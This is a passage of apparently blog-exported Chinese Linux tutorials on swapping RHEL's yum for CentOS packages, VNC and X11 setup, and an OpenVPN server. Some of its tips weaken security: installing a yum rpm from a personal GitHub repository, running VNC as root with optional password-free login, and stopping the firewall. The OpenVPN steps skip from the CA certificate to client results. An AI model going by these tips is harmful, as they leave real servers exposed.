<code>/etc/yum.repos.d/rhel-source.repo</code>，我添加的一个源信息是该文件中最后一个，如下图所示：<br><img src="https://cdn.bugwz.com/006qpCDTly1ffxxd8s1nej30gx09faas.jpg"></li><li>最后我们清楚yum缓存并获取yum列表尝试一下，代码及成功的图示如下所示：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum clean all</span><br><span class="line">yum makecache</span><br></pre></td></tr></table></figure><img src="https://cdn.bugwz.com/006qpCDTly1ffxxiyhj1tj30gx098my3.jpg"></li></ul><h3 id="2-7、使用CentOS的yum进行替换RedHat自带的yum"><a href="#2-7、使用CentOS的yum进行替换RedHat自带的yum" class="headerlink" title="2.7、使用CentOS的yum进行替换RedHat自带的yum"></a>2.7、使用CentOS的yum进行替换RedHat自带的yum</h3><ul><li>首先确定系统是32位的还是64位的，可以使用命令 <code>uname -a</code> 查看，根据系统位数，前往<a href="http://mirrors.163.com/centos/6/os/" target="_blank">网易开源镜像站</a>对应目录下的Packages目录中获取文件链接使用 <code>wget</code> 下载相关软件；</li><li>(我RedHat是32位)相关软件如下所示，不过你会发现网站中并没有<br> <code>yum-3.2.29-30.el6.centos.noarch.rpm</code> ，反而有一个 <code>yum-3.2.29-81.el6.centos.noarch.rpm</code>，我想说的是，你下载后者安装会出错，所以你可从<a href="https://github.com/CUBEGWZ/Other/raw/master/yum-3.2.29-30.el6.centos.noarch.rpm">这里</a>下载 <code>yum-3.2.29-30.el6.centos.noarch.rpm</code> 这个文件</li><li>python-iniparse-0.3.1-2.1.el6.noarch.rpm</li><li>yum-3.2.29-30.el6.centos.noarch.rpm</li><li>yum-metadata-parser-1.1.2-16.el6.i686.rpm</li><li>yum-plugin-fastestmirror-1.1.30-40.el6.noarch.rpm</li><li>然后我们卸载RedHat自带的yum，解释及命令如下所示：</li><li>xargs是一条Unix和类Unix操作系统的常用命令。它的作用是将参数列表转换成小块分段传递给其他命令，以避免参数列表过长的问题；</li><li>–nodeps  强制卸载,不管依赖性；<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpm -qa | grep yum | xargs rpm -e --nodeps</span><br></pre></td></tr></table></figure></li><li>然后安装下载的CentOS的yum包，需要注意的的最后一名命令将两个软件一起安装的原因是防止安装时出现依赖性错误，代码如下：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpm -ivh python-iniparse-0.3.1-2.1.el6.noarch.rpm</span><br><span class="line">rpm -ivh yum-metadata-parser-1.1.2-16.el6.i686.rpm</span><br><span class="line">rpm -ivh yum-3.2.29-30.el6.centos.noarch.rpm yum-plugin-fastestmirror-1.1.30-40.el6.noarch.rpm</span><br></pre></td></tr></table></figure></li><li>然后我们前往<a href="http://mirrors.163.com/.help/centos.html">CentOS镜像使用帮助</a>下载CentOS 6 的repo文件，并将其放置在 <code>/etc/yum.repo.d</code> 目录中,之后编辑下载的 <code>CentOS6-Base-163.repo</code> 文件，将其中的$releasever更改为centos的版本号,此处为 <code>6</code> ,关于 <code>CentOS6-Base-163.repo</code> 文件说明一下：</li><li>CentOS-Base.repo 是yum 网络源的配置文件</li><li>CentOS-Media.repo 是yum 本地源的配置文件****</li><li>最后我们清楚缓存并获取yum列表，之后就可以使用yum命令在线安装软件了，方便至极，代码如下所示：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum clean all</span><br><span class="line">yum makecache</span><br></pre></td></tr></table></figure></li><li>补充：最后比较意思的是，当我们重启服务器的时候，我们会发现，系统启动界面变成了 <code>CentOS</code> 的，然后，让我们利用 <code>cat /etc/issue</code> 查看系统发行版本时还是Red Hat。</li></ul><p><a id="redhat_4"></a></p><h3 id="2-8、添加KDE桌面-x2F-中文支持和VNC设置体验"><a href="#2-8、添加KDE桌面-x2F-中文支持和VNC设置体验" class="headerlink" title="2.8、添加KDE桌面&#x2F;中文支持和VNC设置体验"></a>2.8、添加KDE桌面&#x2F;中文支持和VNC设置体验</h3><h3 id="2-9、添加KDE桌面-x2F-中文支持"><a href="#2-9、添加KDE桌面-x2F-中文支持" class="headerlink" title="2.9、添加KDE桌面&#x2F;中文支持"></a>2.9、添加KDE桌面&#x2F;中文支持</h3><ul><li>在我们可以使用 <code>yum</code>的基础之上，我们需要安装 <code>KDE Desktop</code>这个软件组，我们可以使用下面的命令进行查看与安装：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum grouplist</span><br><span class="line">yum groupinstall <span class="string">&quot;KDE Desktop&quot;</span></span><br></pre></td></tr></table></figure></li><li>之后我们可能需要安装中文支持包，其中包括 <code>kde-i18n-Chinese</code> 和 <code>kde-l10n-Chinese</code>，命令如下所示：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install kde-i18n-Chinese</span><br><span class="line">yum install kde-l10n-Chinese</span><br></pre></td></tr></table></figure></li><li>然后就需要修改系统默认的语言显示，这里有两种办法，第一种，在GUI界面上修改，第二种通过命令行修改，命令行修改的操作是将 <code>/etc/sysconfig/i18n</code> 中的 <code>LANG=&quot;en_US.UTF-8&quot;</code> 改为 <code>LANG=&quot;zh_CN.UTF-8&quot;</code>,然后 <code>logout</code> 重新登录即可。</li><li>关于 <code>i18n</code> 与 <code>l10n</code> 的补充解释：</li><li><code>i18n</code> 是”Internationalization”的缩写，中间的18代表在首字母”i”和尾字母”n”之间省略了 18 个字母，国际化是指采用国际标准提取或显示信息;</li><li><code>l10n</code> 是”Localization”的缩写，中间的10代表在首字母”l”和尾字母”n”之间省略了10个字母，本地化是在国际化的基础上针对不同地区进行个性化设置，就例如微软的系统安装诗句;</li></ul><h3 id="2-10、VNC设置体验"><a href="#2-10、VNC设置体验" class="headerlink" title="2.10、VNC设置体验"></a>2.10、VNC设置体验</h3><ul><li><p>VNC(Virtual Network Computing)是基于RFB（Remote Frame Buffer）协议进行通信的，是一个基于平台无关的简单显示协议的超级瘦客户系统，VNC的缺省端口是main:5900（C&#x2F;S）和http:5800（B&#x2F;S）端口。<br>RFB (远程帧缓存) 是一个远程图形用户的简单协议，因为它工作在帧缓存级别上，所以它可以应用于所有的窗口系统，例如：X11,Windows和Mac系统。由于RFB是基于TCP的一个应用层协议，所以VNC也是基于TCP协议的。</p></li><li><p>所需软件包括，RedHat服务器端安装的VNC服务器端软件，以及Windows下需要的VNC客户端软件，这里使用 <code>VNC Viewer</code>，下面安装VNC服务器端软件：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install vnc-server</span><br></pre></td></tr></table></figure></li><li><p>然后我们需要修改VNC的配置文件 <code>/etc/sysconfig/vncservers</code> ，根据其中示例设置一个用户认证连接设置，这里我们使用root用户进行远程连接，也可以创建其他用户进行连接，我的配置文件如下所示：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">VNCSERVERS=<span class="string">&quot;1:root&quot;</span></span><br><span class="line">VNCSERVERARGS[1]=<span class="string">&quot;-geometry 1024x768&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>其中关于VNC的配置文件详细解释如下所示：</p></li><li><p>数字 <code>1</code> 代表远程连接的实际TCP端口为 <code>5900+1</code> ，这是因为VNC Server 的默认初始端口是 5900，用户设置的端口是和初始端口做加法然后使用的，如果想要修改，可以进入 <code>/usr/bin/vncserver</code> 修改即可；</p></li><li><p>这里的 <code>root</code> 是一个系统用户，如果设置了多个用户可以通过自己的专属端口使用VNC，其中VNCSERVERS的内容可以写成”1:root 2:test”，但是必须存在多个VNCSERVERARGS[*] 。</p></li><li><p>VNCSERVERARGS的参数 <code>-geometry 1024x768</code> 是设置客户端显示的桌面分辨率大小。</p></li><li><p>VNCSERVERARGS的参数 <code>-nohttpd</code> 是不监听HTTP端口。</p></li><li><p>VNCSERVERARGS的参数 <code>-nolisten 6000</code> 是不监听TCP 6000端口。</p></li><li><p>VNCSERVERARGS的参数 <code>-localhost</code> 指只允许从本机访问</p></li><li><p>VNCSERVERARGS的参数 <code>-AlwaysShared</code> 这是默认参数，不写的话也是默认存在的，此参数允许可以多个客户端同时使用一个用户及对应的端口进行连接，但是连接后，所有的VNC界面将显示相同，所有人都会看到相同的界面。</p></li><li><p>VNCSERVERARGS的参数 <code>-SecurityTypes  None</code> 是指登录不需要密码认证，如果将 <code>None</code> 换成 <code>VncAuth</code> ,则需要密码认证，默认值是 <code>VncAuth</code> 。</p></li><li><p>VNCSERVERARGS的参数 <code>-depth</code> 是色深，参数有8、16、24、32。</p></li><li><p>需要注意防火墙的影响，如果服务器端开启了 <code>iptables</code> 防火墙，我们可以关闭防火墙，或者添加防火墙规则，允许我们的端口通过</p></li><li><p>关闭防火墙：<code> service iptables stop</code>;</p></li><li><p>添加防火墙规则，允许端口通过：<code>iptables -A INPUT -p tcp --dport 5900:5920 -j ACCEPT</code>;</p></li></ul><p><a id="redhat_5"></a></p><h1 id="5-XShell和X11转发-1"><a href="#5-XShell和X11转发-1" class="headerlink" title="5. XShell和X11转发"></a>5. XShell和X11转发</h1><p>X11是X Window系统的简称，由于X Window图形系统是一个经典的Server&#x2F;Client架构，两者通过正常的网络协议进行通信。可是实现比如：服务器中并未安装桌面环境，通过SSH建立的隧道进行转发后，可以实现在另外一台启动了X Server的机器上，由X Server调用本机硬件资源，在屏幕上显示出界面。在windows下我们可以使用 <code>Xming X Server</code> 这款软件接受远程传输来的绘图的相关指令并在本机绘制。</p><ul><li>前提条件是，服务器端已经开启了X11转发，而系统默认是不开启的，我们需要编辑 <code>/etc/ssh/sshd_config</code> 文件，设置 <code>X11Forwarding yes</code>，然后执行 <code>service sshd restart</code> 命令</li><li>在服务器开启了之后，我们还需要在SSH连接软件中开启类似于 “X11 转移” 的功能，然后打开本地的 <code>X Server</code> 软件，我们在windows下测试使用的软件是 <code>Xming X Server</code> 。</li><li>所有 <code>X Server</code> 启动后默认会监听本地6000端口， <code>X client</code> 通过环境变量DISPLAY获取 <code>X Server</code> 服务地址，例如<br> <code>DISPLAY=localhost:0.0</code> 代表 <code>X Server</code> 在本机6000端口，<br>  <code>DISPLAY=localhost:1.0</code> 代表 <code>X Server</code> 在本机6001端口,依此类推；建立连接之前， <code>X Server</code> 还需要验证 <code>X client</code> 的身份，最常的是基于Cookie机制。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
            <tag> Campus </tag>
            
            <tag> Redhat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu搭建OpenVPN服务器</title>
      <link href="/2015/11/08/ubuntu-openvpn/"/>
      <url>/2015/11/08/ubuntu-openvpn/</url>
      
        <content type="html"><![CDATA[<h2 id="一、说明"><a href="#一、说明" class="headerlink" title="一、说明"></a>一、说明</h2><p>对于vpn以前使用最多的是pptpd这个解决方案，但是pptpd相对于OpenVPN来说，没有OpenVPN安全，而且pptpd在Linux下命令行支持不是很好，稳定性也不如OpenVPN。所以最后就选择OpenVPN来搭建VPN。本文的OpenVPN Server安装在Ubuntu 14.04上安装.有关OpenVPN在CentOS6.6 64bit的配置完全可以使用，已经经过验证。文章后有CentOS详细配置命令及步骤。</p><h2 id="二、OpenVPN原理"><a href="#二、OpenVPN原理" class="headerlink" title="二、OpenVPN原理"></a>二、OpenVPN原理</h2><ol><li>OpenVPN通过使用公开密钥（非对称密钥，加密解密使用不同的key，一个称为Publice key，另外一个是Private key）对数据进行加密的。这种方式称为TLS加密</li><li>OpenVPN使用TLS加密的工作过程是，首先VPN Sevrver端和VPN Client端要有相同的CA证书，双方通过交换证书验证双方的合法性，用于决定是否建立VPN连接。</li><li>然后使用对方的CA证书，把自己目前使用的数据加密方法加密后发送给对方，由于使用的是对方CA证书加密，所以只有对方CA证书对应的Private key才能解密该数据，这样就保证了此密钥的安全性，并且此密钥是定期改变的，对于窃听者来说，可能还没有破解出此密钥，VPN通信双方可能就已经更换密钥了。</li></ol><h2 id="三、安装OpenVPN"><a href="#三、安装OpenVPN" class="headerlink" title="三、安装OpenVPN"></a>三、安装OpenVPN</h2><p>OpenVPN的安装我们分为<code>apt-get</code>方式和源码方式，下面我们只讲解<code>apt-get</code>方式的安装。有关源码方式安装OpenVPN，可自行查询。<code>apt-get</code>方式安装的命令如下所示：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get -y install openvpn libssl-dev openssl</span><br></pre></td></tr></table></figure><p>OpenVPN安装完毕后，我们来查看OpenVPN的版本，如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openvpn –version</span><br></pre></td></tr></table></figure><p>这里我安装的<code>OpenVPN</code>的版本为<code>2.3.2</code>。<br>我们再来查看下<code>OpenVPN</code>安装时产生的文件，如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dpkg -L openvpn |more</span><br></pre></td></tr></table></figure><p><code>OpenVPN</code>安装完毕后，我们再来安装<code>easy-rsa</code>,<code>easy-rsa</code>是用来制作<code>OpenVPN</code>相关证书的。安装<code>easy-rsa</code>，使用如下命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get -y install easy-rsa</span><br></pre></td></tr></table></figure><p>查看<code>easy-rsa</code>安装的文件，代码如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dpkg -L easy-rsa |more</span><br></pre></td></tr></table></figure><p>注：在我的服务器上面<code>easy-rsa</code>已经安装到<code>/usr/share/easy-rsa/</code>目录下。</p><h2 id="四、制作相关证书"><a href="#四、制作相关证书" class="headerlink" title="四、制作相关证书"></a>四、制作相关证书</h2><p>根据第一章节<code>OpenVPN</code>的工作原理，我们可以知道<code>OpenVPN</code>的证书分为三部分：<code>CA证书</code>、<code>Server端证书</code>、<code>Client端证书</code>。下面我们通过<code>easy-rsa</code>分别对其进行制作。</p><ol><li>制作CA证书<br>  <code>OpenVPN</code>与<code>easy-rsa</code>安装完毕后，我们需要在<code>/etc/openvpn/</code>目录下创建<code>easy-rsa</code>文件夹，如下：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">mkdir</span> /etc/openvpn/easy-rsa/</span><br></pre></td></tr></table></figure>然后把<code>/usr/share/easy-rsa/</code>目录下的所有文件全部复制到<code>/etc/openvpn/easy-rsa/</code>下，如下代码所示：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">cp</span> -r /usr/share/easy-rsa/* /etc/openvpn/easy-rsa/</span><br></pre></td></tr></table></figure>当然，我们也可以直接在<code>/usr/share/easy-rsa/</code>制作相关的证书，但是为了后续的管理证书的方便，我们还是把<code>easy-rsa</code>放在了<code>OpenVPN</code>的启动目录下。</li></ol><p>注意：由于我们现在使用的是<code>Ubuntu</code>系统，所以我们必须切换到<code>root</code>用户下才能制作相关证书，否则<code>easy-rsa</code>会报错。如果是<code>Centos</code>系统，则不存在此问题。因为我一直处于<code>root</code>状态，所以不用切换了，当然，这种一直处于<code>root</code>状态的习惯并不是好习惯，毕竟<code>root</code>太强大了。<br>在开始制作CA证书之前，我们还需要编辑<code>vars</code>文件，进入并修改下面相关选项内容即可。如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vi /etc/openvpn/easy-rsa/vars</span><br><span class="line"><span class="built_in">export</span> KEY_COUNTRY=”CN”</span><br><span class="line"><span class="built_in">export</span> KEY_PROVINCE=”SD”</span><br><span class="line"><span class="built_in">export</span> KEY_CITY=”JN”</span><br><span class="line"><span class="built_in">export</span> KEY_ORG=”SOIL<span class="string">&quot;</span></span><br><span class="line"><span class="string">export KEY_EMAIL=”abc@abc.com”</span></span><br><span class="line"><span class="string">export KEY_OU=”test”</span></span><br><span class="line"><span class="string">export KEY_NAME=”test”  </span></span><br></pre></td></tr></table></figure><p><code>vars</code>文件主要用于设置证书的相关组织信息，红色部分的内容可以根据自己的实际情况自行修改。其中<code>export KEY_NAME=”test”</code>这个要记住下，我们下面在制作<code>Server端证书</code>时，会使用到。以上内容，我们也可以使用系统默认的，也就是说不进行修改也是可以使用的。</p><p>然后使用<code>source vars</code>命令使其生效，如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> vars</span><br><span class="line">./clean-all</span><br></pre></td></tr></table></figure><p>注意：执行<code>clean-all</code>命令会删除当前目录下的<code>keys</code>文件夹。</p><p>现在开始正式制作<code>CA证书</code>：<br>[从之前博客找回的部分信息，此处缺图片，待后期重新尝试。]</p><p>然后如果成功的话，会提示类似与下面的提示（我的是windows10，所以提示是这样的）：<br>[从之前博客找回的部分信息，此处缺图片，待后期重新尝试。]</p><p>windows7端的提示可能是这样的：<br>[从之前博客找回的部分信息，此处缺图片，待后期重新尝试。]</p><p>查看了一下ip，的确连上了。<br>[从之前博客找回的部分信息，此处缺图片，待后期重新尝试。]</p><p>注意：上图中的<code>client</code>就是根据<code>client.ovpn</code>，这个文件名来的。</p><p>通过上图，我们可以看到本机确实已经连接到Server端，而且获得的IP地址也确实为<code>10.8.0.6</code>。</p><h2 id="五、在Linux上"><a href="#五、在Linux上" class="headerlink" title="五、在Linux上"></a>五、在Linux上</h2><p>在<code>Windows</code>上测试完毕后，我们现在在切换到<code>Linux</code>系统。这个<code>Linux</code>系统是我的搬瓦工的一个VPS，之前是用来番茄的，现在用来测试一下。它的系统叫我更改成<code>Ubuntu14.04</code>,。</p><p>要在<code>Ubuntu</code>上连接<code>OpenVPN Server端</code>，我们需要先安装<code>OpenVPN</code>软件，如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get -y install openvpn</span><br></pre></td></tr></table></figure><p>安装完毕后，把我们刚刚在Windows系统配置的文件上传到Ubuntu系统中。之前我们先在<code>/etc/openvpn</code>目录下面创建了一个<code>test</code>文件，用于存放上传的那四个文件，然后我们使用<code>FileZilla</code>工具利用SSH上传，上传完成如下：<br>[从之前博客找回的部分信息，此处缺图片，待后期重新尝试。]</p><p>注意：上传完毕后，我们不需要修改任何配置文件。因为这几个文件在Windows下已经可以正确连接<code>OpenVPN Server端</code>。</p><p>注意：在连接<code>Server端</code>之前，一定要切换到root用户下。因为在连接<code>Server端</code>时，<code>OpenVPN</code>会在本机创建一个虚拟网卡，如果使用普通用户的话，是没有权限创建虚拟网卡的。</p><p>切换到<code>root</code>用户，使用<code>sudo su</code>命令，然后切换到我们创建的<code>test</code>目录下，然后使用如下命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openvpn --config client.ovpn</span><br></pre></td></tr></table></figure><p>如果出现下图的信息，说明已经正确连接Server端。<br>[从之前博客找回的部分信息，此处缺图片，待后期重新尝试。]</p><p>现在我们在本机使用<code>ifconfig</code>进行查看，在此建议重新开启一个新的<code>ssh</code>窗口。<br>[从之前博客找回的部分信息，此处缺图片，待后期重新尝试。]</p><p>通过上图，我们可以很明显的看出，本机已经正确连接<code>Server端</code>，并且也在本机虚拟出一个叫<code>tun0</code>的虚拟网卡。</p><p>如果想让<code>Ubuntu</code>开机启动并后台运行的话，可以把这条命令写入<code>rc.local</code>文件中。我们先用下面的命令打开<code>rc.local</code>文件：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/rc.local</span><br></pre></td></tr></table></figure><p>然后将下面的代码录入该文件并保存：<br><code>/usr/sbin/openvpn --config /etc/openvpn/test/client.ovpn &gt;/var/log/openvpn.log &amp;</code></p><p>注意，命令末尾的<code>&amp;</code>符号不能省略，否则将可能阻塞系统的正常启动。同时这个时候，<code>client.ovpn</code>文件中有关证书的配置一定要写成绝对路径，要不然系统会报错。如下：<br>[从之前博客找回的部分信息，此处缺图片，待后期重新尝试。]</p><p>如果是<code>CentOS</code>系统的话，我们首先需要安装<code>epel</code>源，然后安装<code>OpenVPN</code>软件包。如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpm -ivh http://dl.fedoraproject.org/pub/epel/epel-release-latest-6.noarch.rpm</span><br><span class="line">yum -y install openvpn</span><br></pre></td></tr></table></figure><p>以上安装完毕后，把<code>Windows</code>已经成功连接的<code>Client</code>相关文件上传到<code>CentOS</code>系统中，然后连接方法和<code>Ubuntu</code>系统上一样。</p><p>注意：如果在<code>CentOS</code>系统要开机启动的话，也是和<code>Ubuntu</code>系统是一样的，但是有一点需要指出就是<code>Client</code>相关配置文件不能放在<code>/root</code>目录下。</p><p>因为<code>CentOS</code>的<code>OpenVPN Server</code>配置和<code>Ubuntu</code>基本一样，所以就不再单独写一篇有关<code>CentOS</code>下安装配置<code>OpenVPN Server</code>的文章。下面附上在<code>CentOS</code>下，所有执行的命令。如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpm -ivh http://dl.fedoraproject.org/pub/epel/epel-release-latest-6.noarch.rpm</span><br><span class="line">yum -y install openvpn</span><br><span class="line">rpm -ql openvpn</span><br><span class="line"><span class="built_in">cat</span> /usr/share/doc/openvpn-2.3.7/sample/sample-config-files/README</span><br><span class="line">yum -y install easy-rsa</span><br><span class="line">rpm -ql easy-rsa</span><br><span class="line"><span class="built_in">cd</span> /usr/share/easy-rsa/2.0/</span><br><span class="line">vim vars</span><br><span class="line"><span class="built_in">export</span> KEY_COUNTRY=”CN”</span><br><span class="line"><span class="built_in">export</span> KEY_PROVINCE=”SD”</span><br><span class="line"><span class="built_in">export</span> KEY_CITY=”JN”</span><br><span class="line"><span class="built_in">export</span> KEY_ORG=”SOIL”</span><br><span class="line"><span class="built_in">export</span> KEY_EMAIL=”abc@abc.com”</span><br><span class="line"><span class="built_in">export</span> KEY_OU=”SOIL”</span><br><span class="line"><span class="built_in">export</span> KEY_NAME=”<span class="built_in">test</span>”</span><br><span class="line"><span class="built_in">source</span> vars</span><br><span class="line">./clean-all</span><br><span class="line">./build-ca</span><br><span class="line">./build-key-server <span class="built_in">test</span></span><br><span class="line">./build-dh</span><br><span class="line">./build-key centos</span><br><span class="line"><span class="built_in">cd</span>  keys</span><br><span class="line"><span class="built_in">cp</span> ca.crt test.key test.crt dh2048.pem /etc/openvpn/</span><br><span class="line"><span class="built_in">cp</span> ca.crt centos.key centos.crt /root/</span><br><span class="line"><span class="built_in">cp</span> /usr/share/doc/openvpn-2.3.7/sample/sample-config-files/client.conf /root</span><br><span class="line"><span class="built_in">cp</span> /usr/share/doc/openvpn-2.3.7/sample/sample-config-files/server.conf /etc/openvpn/</span><br></pre></td></tr></table></figure><p>服务器端配置文件：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/openvpn/server.conf</span><br><span class="line">grep -vE “;|<span class="comment">#|^$” /etc/openvpn/server.conf</span></span><br><span class="line">port 1194</span><br><span class="line">proto udp</span><br><span class="line">dev tun</span><br><span class="line">ca ca.crt</span><br><span class="line">cert test.crt</span><br><span class="line">key test.key</span><br><span class="line">dh dh2048.pem</span><br><span class="line">server 10.8.0.0 255.255.255.0</span><br><span class="line">ifconfig-pool-persist ipp.txt</span><br><span class="line">keepalive 10 120</span><br><span class="line">comp-lzo</span><br><span class="line">persist-key</span><br><span class="line">persist-tun</span><br><span class="line">status openvpn-status.log</span><br><span class="line">verb 3</span><br></pre></td></tr></table></figure><p>客户端配置文件：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep -vE “;|<span class="comment">#|^$” centos.conf</span></span><br><span class="line">client</span><br><span class="line">dev tun</span><br><span class="line">proto udp</span><br><span class="line">remote 182.254.223.140 1194</span><br><span class="line">resolv-retry infinite</span><br><span class="line">nobind</span><br><span class="line">persist-key</span><br><span class="line">persist-tun</span><br><span class="line">ca ca.crt</span><br><span class="line">cert centos.crt</span><br><span class="line">key centos.key</span><br><span class="line">remote-cert-tls server</span><br><span class="line">comp-lzo</span><br><span class="line">verb 3</span><br></pre></td></tr></table></figure><p>以上信息参考网络上的信息，自己亲身实践并整理一番，有不对之处，请告知。（测试时间：2015年11月8日）</p><hr>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> OpenVPN </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
